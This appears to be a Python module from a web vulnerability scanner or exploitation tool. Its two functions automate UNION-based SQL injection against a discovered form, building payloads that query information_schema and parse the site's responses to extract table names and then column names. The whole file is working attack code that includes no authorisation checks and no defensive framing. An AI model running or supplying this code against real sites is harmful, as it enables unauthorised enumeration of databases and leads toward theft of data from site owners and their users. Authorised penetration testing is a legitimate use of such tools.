import requests
import re
from scanners import submit_form

def exploit_table_names_union_sqli(form_details, exploit_info):
    
    # Exploit vulnerabilites detected through SQLi

    source_url = form_details["source_url"]
    column_count = exploit_info["column_count"]
    displayed_columns = exploit_info["displayed_columns"]
    
    print("Extracting table names on : " + str(source_url))
    
    try:
        # Only need the first displayed column
        exploit_col_index = displayed_columns[0]
        payload_list = ["NULL"] * column_count
        
        # Extract Table Names
        data_to_extract = "CONCAT('START-TABLES:', GROUP_CONCAT(table_name), ':END-TABLES')"
        payload_list[exploit_col_index] = (
            f"{data_to_extract} FROM information_schema.tables WHERE table_schema=database()"
        )
        tables_payload = f"' UNION SELECT {', '.join(payload_list)}--"
        response_tables = submit_form(form_details, source_url, tables_payload)

        match = re.search(r'START-TABLES:(.*?):END-TABLES', response_tables.text)
        
        if match:
            # group(1) contains the text captured by (.*?)
            table_names_str = match.group(1)
            table_names = table_names_str.split(',')
            print(f"Found Tables -> {table_names}")
            return table_names
        else:
            print("Could not extract table names from the response.")
            return None

    except requests.exceptions.RequestException as e:
        print(f"An error occurred during the exploit: {e}")
        return None


def exploit_column_names_union_sqli(form_details, exploit_info, target_table):
        
    source_url = form_details["source_url"]
    column_count = exploit_info["column_count"]
    displayed_columns = exploit_info["displayed_columns"]

    print(f"Extracting column names from '{target_table}'...")

    try:
        exploit_col_index = displayed_columns[0]
        payload_list = ["NULL"] * column_count
        
        # Use the same marker technique for column names
        data_to_extract = "CONCAT('START-COLS:', GROUP_CONCAT(column_name), ':END-COLS')"
        
        payload_list[exploit_col_index] = (
            f"{data_to_extract} FROM information_schema.columns "
            f"WHERE table_name='{target_table}' AND table_schema=database()"
        )

        final_columns_payload = f"' UNION SELECT {', '.join(payload_list)}--"
        response = submit_form(form_details, source_url, final_columns_payload)

        # Parse the response to find our extracted data
        match = re.search(r'START-COLS:(.*?):END-COLS', response.text)
        
        if match:
            column_names_str = match.group(1)
            column_names = column_names_str.split(',')
            print(f"SUCCESS: Found Columns in '{target_table}' -> {column_names}")
            return column_names
        else:
            print("FAILED: Could not extract column names.")
            return None

    except requests.exceptions.RequestException as e:
        print(f"An error occurred during the exploit: {e}")
        return None
    
